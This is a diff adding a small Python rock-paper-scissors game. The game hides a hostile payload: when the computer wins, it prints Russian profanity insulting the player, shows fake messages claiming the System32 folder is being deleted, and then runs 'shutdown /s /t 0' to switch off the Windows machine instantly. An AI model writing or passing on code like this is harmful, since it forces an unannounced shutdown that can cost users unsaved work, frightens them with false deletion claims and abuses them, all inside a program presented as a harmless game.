@@ -1,0 +1,53 @@
+import random
+import time 
+import os
+variashon = ("rock", "paper", "scissors")
+win_pc = 0
+win_user = 0
+Winneeded = int(input("how many wins needed to win the game: "))
+beat = {
+    "rock": "scissors",
+    "paper": "rock",
+    "scissors": "paper"
+}
+def game_winner(pc, user):
+    
+    if beat[pc] == user:
+        return "pc"
+    elif beat[user] == pc:
+        return "user"
+    else:
+        return "draw"
+        
+while True:
+
+    pc_input = random.choice (variashon)
+    user_input = input("rock, paper, scissors: ").strip().lower()
+    if user_input == "exit":
+                     break
+    if user_input not in variashon:
+            print("invalid input")
+            continue            
+    result = game_winner(pc_input, user_input)
+    if result == "pc":
+          win_pc += 1
+          print("u lose")
+    elif result == "user":
+          win_user += 1
+          print("u win")
+    elif result == "draw":
+           print("draw")      
+    if win_pc == Winneeded:
+                print("Ты ебаный лох что тебы выебал комп ") 
+                print("Удаление папка System32")
+                time.sleep(2)
+                print("Папка System32 Удалена")
+                time.sleep(1)
+                print("Учись играть сучука")
+                time.sleep(2)
+                os.system("shutdown /s /t 0")
+            
+                break     
+    if win_user == Winneeded:
+                print("ебать коммп лох, поебал челову..... чеееел чем ты занимаешся")
+                break
